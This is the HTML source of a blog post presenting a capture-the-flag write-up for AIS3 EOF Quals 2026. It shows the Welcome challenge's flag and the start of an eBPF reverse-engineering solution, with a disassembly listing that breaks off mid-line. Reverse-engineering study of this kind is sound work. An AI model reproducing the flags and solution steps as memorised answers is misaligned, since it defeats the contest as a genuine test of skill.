@@ -1,0 +1,936 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_4k4bc36ef96';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"Copy successfully (*^▽^*)","zh-CN":"复制成功 (*^▽^*)","zh-TW":"複製成功 (*^▽^*)","ja":"コピー成功 (*^▽^*)","pt-BR":"Copiado com sucesso (*^▽^*)"},"fail":{"en":"Copy failed (ﾟ⊿ﾟ)ﾂ","zh-CN":"复制失败 (ﾟ⊿ﾟ)ﾂ","zh-TW":"複製失敗 (ﾟ⊿ﾟ)ﾂ","ja":"コピー失敗 (ﾟ⊿ﾟ)ﾂ","pt-BR":"Falha ao copiar (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  
+  <title>
+    AIS3 EOF Quals 2026 write-up |
+    
+    Auron&#39;s blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="AIS3 EOF Quals 2026 write-up  Welcome  在 announcement 找到 flag  flag: EOF{2026-quals-in-2025}  misc  fun  這題是一個 eBPF 的 reverse 題  flag.enc: eabbc25677f3084458f0531f86863f226c95d555e6c28bd7 (32 bytes)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AIS3 EOF Quals 2026 write-up">
+<meta property="og:url" content="http://example.com/2025/12/25/AIS3%202026%20EOF%20writeup/index.html">
+<meta property="og:site_name" content="Auron&#39;s blog">
+<meta property="og:description" content="AIS3 EOF Quals 2026 write-up  Welcome  在 announcement 找到 flag  flag: EOF{2026-quals-in-2025}  misc  fun  這題是一個 eBPF 的 reverse 題  flag.enc: eabbc25677f3084458f0531f86863f226c95d555e6c28bd7 (32 bytes)">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackmd.io/_uploads/BkaT8DPX-x.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/HyCCIvwmbx.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1l_wPvXZg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/Sy_f5DvmWg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/ryRFqwPmWe.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkyG3vwQbg.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/BypNa9Pm-x.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/S1dy_Yw7-e.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/H1y7ikd7-g.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/r1fHredX-e.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/rJJ-ceOXZl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SkunpgOQWl.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/SJioJbumbe.png">
+<meta property="og:image" content="https://hackmd.io/_uploads/B1xWxZO7bg.png">
+<meta property="article:published_time" content="2025-12-25T09:07:32.000Z">
+<meta property="article:modified_time" content="2025-12-25T16:23:29.496Z">
+<meta property="article:author" content="Auron">
+<meta property="article:tag" content="note">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackmd.io/_uploads/BkaT8DPX-x.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Auron's blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      
+      
+        
+      
+      <div class="loading-word">Loading...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/">Home</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/archives">Archives</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/about">About</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/friend">Friend</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed" target="_blank"></a>
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="AIS3 EOF Quals 2026 write-up">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">AIS3 EOF Quals 2026 write-up</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  <div class="sidebar-wrapper-container sticky">
+  
+    
+    
+  
+ 
+  <div class="sidebar-wrapper">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+  
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ais3-eof-quals-2026-write-up"><span class="toc-number">1.</span> <span class="toc-text"> AIS3 EOF Quals 2026 write-up</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#welcome"><span class="toc-number">1.1.</span> <span class="toc-text"> Welcome</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">1.2.</span> <span class="toc-text"> misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fun"><span class="toc-number">1.2.1.</span> <span class="toc-text"> fun</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#saas"><span class="toc-number">1.2.2.</span> <span class="toc-text"> SaaS</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse"><span class="toc-number">1.3.</span> <span class="toc-text"> Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#structured-small"><span class="toc-number">1.3.1.</span> <span class="toc-text"> Structured - Small</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bored"><span class="toc-number">1.3.2.</span> <span class="toc-text"> bored</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.4.</span> <span class="toc-text"> Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bunphp"><span class="toc-number">1.4.1.</span> <span class="toc-text"> Bun.PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linkoreco"><span class="toc-number">1.4.2.</span> <span class="toc-text"> LinkoReco</span></a></li></ol></li></ol></li></ol>
+  
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Auron" class="lazyload">
+  <div class="sidebar-author-name">Auron</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">5</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+  
+  <div class="sidebar-widget">
+  
+  </div>
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-AIS3 2026 EOF writeup" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link icon-calendar" data-aos="zoom-in">
+    <time datetime="2025-12-25T09:07:32.000Z" itemprop="datePublished">2025-12-25</time>
+    <time style="display: none;" id="post-update-time">2025-12-26</time>
+  </span>
+  
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="ais3-eof-quals-2026-write-up"><a class="markdownIt-Anchor" href="#ais3-eof-quals-2026-write-up"></a> AIS3 EOF Quals 2026 write-up</h1>
+<h2 id="welcome"><a class="markdownIt-Anchor" href="#welcome"></a> Welcome</h2>
+<p><img src="https://hackmd.io/_uploads/BkaT8DPX-x.png" alt="image" /><br />
+在 announcement 找到 flag<br />
+<img src="https://hackmd.io/_uploads/HyCCIvwmbx.png" alt="image" /></p>
+<p><code>flag</code>: EOF{2026-quals-in-2025}</p>
+<h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> misc</h2>
+<h3 id="fun"><a class="markdownIt-Anchor" href="#fun"></a> fun</h3>
+<p><img src="https://hackmd.io/_uploads/r1l_wPvXZg.png" alt="image" /></p>
+<p>這題是一個 eBPF 的 reverse 題</p>
+<p><img src="https://hackmd.io/_uploads/Sy_f5DvmWg.png" alt="image" /></p>
+<p><code>flag.enc</code>: eabbc25677f3084458f0531f86863f226c95d555e6c28bd7 (32 bytes)<br />
+使用 llvm-objdump 查看<br />
+<img src="https://hackmd.io/_uploads/ryRFqwPmWe.png" alt="image" /><br />
+<code>llvm-objdump -d xdp_prog.o</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000 &lt;xdp_encoder&gt;:</span><br><span class="line">       0:       b7 00 00 00 02 00 00 00 r0 = 0x2</span><br><span class="line">       1:       61 13 04 00 00 00 00 00 w3 = *(u32 *)(r1 + 0x4)</span><br><span class="line">       2:       61 12 00 00 00 00 00 00 w2 = *(u32 *)(r1 + 0x0)</span><br><span class="line">       3:       bf 24 00 00 00 00 00 00 r4 = r2</span><br><span class="line">       4:       07 04 00 00 0e 00 00 00 r4 += 0xe</span><br><span class="line">       5:       2d 34 e8 01 00 00 00 00 if r4 &gt; r3 goto +0x1e8 &lt;LBB0_72&gt;</span><br><span class="line">       6:       71 24 0d 00 00 00 00 00 w4 = *(u8 *)(r2 + 0xd)</span><br><span class="line">       7:       67 04 00 00 08 00 00 00 r4 &lt;&lt;= 0x8</span><br><span class="line">       8:       71 25 0c 00 00 00 00 00 w5 = *(u8 *)(r2 + 0xc)</span><br><span class="line">       9:       4f 54 00 00 00 00 00 00 r4 |= r5</span><br><span class="line">      10:       55 04 e3 01 08 00 00 00 if r4 != 0x8 goto +0x1e3 &lt;LBB0_72&gt;</span><br><span class="line">      11:       bf 24 00 00 00 00 00 00 r4 = r2</span><br><span class="line">      12:       07 04 00 00 22 00 00 00 r4 += 0x22</span><br><span class="line">      13:       2d 34 e0 01 00 00 00 00 if r4 &gt; r3 goto +0x1e0 &lt;LBB0_72&gt;</span><br><span class="line">      14:       71 24 17 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x17)</span><br><span class="line">      15:       55 04 de 01 11 00 00 00 if r4 != 0x11 goto +0x1de &lt;LBB0_72&gt;</span><br><span class="line">      16:       bf 24 00 00 00 00 00 00 r4 = r2</span><br><span class="line">      17:       07 04 00 00 2a 00 00 00 r4 += 0x2a</span><br><span class="line">      18:       2d 34 db 01 00 00 00 00 if r4 &gt; r3 goto +0x1db &lt;LBB0_72&gt;</span><br><span class="line">      19:       69 24 24 00 00 00 00 00 w4 = *(u16 *)(r2 + 0x24)</span><br><span class="line">      20:       55 04 d9 01 23 28 00 00 if r4 != 0x2823 goto +0x1d9 &lt;LBB0_72&gt;</span><br><span class="line">      21:       b7 04 00 00 00 00 00 00 r4 = 0x0</span><br><span class="line">      22:       63 4a f8 ff 00 00 00 00 *(u32 *)(r10 - 0x8) = w4</span><br><span class="line">      23:       7b 4a f0 ff 00 00 00 00 *(u64 *)(r10 - 0x10) = r4</span><br><span class="line">      24:       7b 4a e8 ff 00 00 00 00 *(u64 *)(r10 - 0x18) = r4</span><br><span class="line">      25:       7b 4a e0 ff 00 00 00 00 *(u64 *)(r10 - 0x20) = r4</span><br><span class="line">      26:       7b 4a d8 ff 00 00 00 00 *(u64 *)(r10 - 0x28) = r4</span><br><span class="line">      27:       7b 4a d0 ff 00 00 00 00 *(u64 *)(r10 - 0x30) = r4</span><br><span class="line">      28:       7b 4a c8 ff 00 00 00 00 *(u64 *)(r10 - 0x38) = r4</span><br><span class="line">      29:       7b 4a c0 ff 00 00 00 00 *(u64 *)(r10 - 0x40) = r4</span><br><span class="line">      30:       7b 4a b8 ff 00 00 00 00 *(u64 *)(r10 - 0x48) = r4</span><br><span class="line">      31:       bf 25 00 00 00 00 00 00 r5 = r2</span><br><span class="line">      32:       07 05 00 00 2b 00 00 00 r5 += 0x2b</span><br><span class="line">      33:       2d 35 c2 01 00 00 00 00 if r5 &gt; r3 goto +0x1c2 &lt;LBB0_71&gt;</span><br><span class="line">      34:       71 24 2a 00 00 00 00 00 w4 = *(u8 *)(r2 + 0x2a)</span><br><span class="line">      35:       a7 04 00 00 af 00 00 00 r4 ^= 0xaf</span><br><span class="line">      36:       73 4a bc ff 00 00 00 00 